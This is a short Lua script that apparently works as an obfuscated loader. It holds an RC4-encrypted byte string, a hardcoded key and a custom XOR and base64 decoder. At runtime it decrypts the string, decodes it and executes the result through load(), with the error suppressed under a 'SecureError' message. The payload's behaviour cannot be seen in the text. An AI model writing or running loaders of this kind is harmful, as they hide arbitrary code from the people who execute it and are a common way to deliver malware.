local mD9x6kI1 = "\184\161\205\230\227\083\184\076\132\163\113\035\076\007\197\061\167\126\111\251\034\022\038\222\179\218\144\078\196\056\190\255\074\017\204\148\040\105\049\085\106\086\212\241\061\218\080\201\061\077\080\164\192\024\130\045\057\056\150\097\094\214\026\190\157\090\088\088\123\131\238\130\014\123\162\140\198\076\174\082\227\109\166\160\105\199\221\038\232\113\005\078\130\028\113\026\244\003\001\148\158\027\181\126\034\197\151\113\160\054\192\023\024\151\117\139\017\243\118\133\089\156\066\171\159\064\001\078\164\100\237\102\174\200\088\051\012\242\108\052\157\047\121\252\169\029\007\104\243\052\180\086\024\017\051\209\074\211\024\167\037\025\080\207\082\084\051\159\221\190\124\243\118\153\060\080\033\137\202\225\163\178\188\049\226\191\051\232\189\212\251\242\049\046\203\119\130\026\208\150\127\062\102\153\048\238\066\069\112\127\117\095\230\219\115\176\187\029\195\123\139\238\168\241\122\108\243\239\110\053\087\019\059\061\164\076\155\070\106\034\018\224\145\023\182\205\045\252\143\076\231\081\175\017\180\158\249\153\255\090\129\063\164\109\220\081\112\148\234\192\034\143\122\251\100\039\039\154\127\038\211\073\080\046\075\126\237\191\092\034\160\219"
local Mqn7oaSD = "efyk1kYWrc4NSSJi"
local function pDh5T6Xn(a,b) local p,c=1,0; while a>0 and b>0 do local ra,rb=a%2,b%2; if ra~=rb then c=c+p end; a,b,p=(a-ra)/2,(b-rb)/2,p*2; end; if a<b then a=b end; while a>0 do local ra=a%2; if ra>0 then c=c+p end; a,p=(a-ra)/2,p*2; end; return c; end
local function EJXsgHVv(d,k)
    local s = {} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do
        j=(j+s[i]+string.byte(k,(i%#k)+1))%256
        s[i],s[j]=s[j],s[i]
    end
    local i,out = 0,{}
    j=0
    for idx=1,#d do
        i=(i+1)%256
        j=(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(pDh5T6Xn(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local function FsY7jbsY(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local r=0
        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(r)
    end))
end
local ok, err = pcall(function()
    local res = EJXsgHVv(mD9x6kI1, Mqn7oaSD)
    assert(load(FsY7jbsY(res)))()
end)
if not ok then print("SecureError: "..tostring(err)) end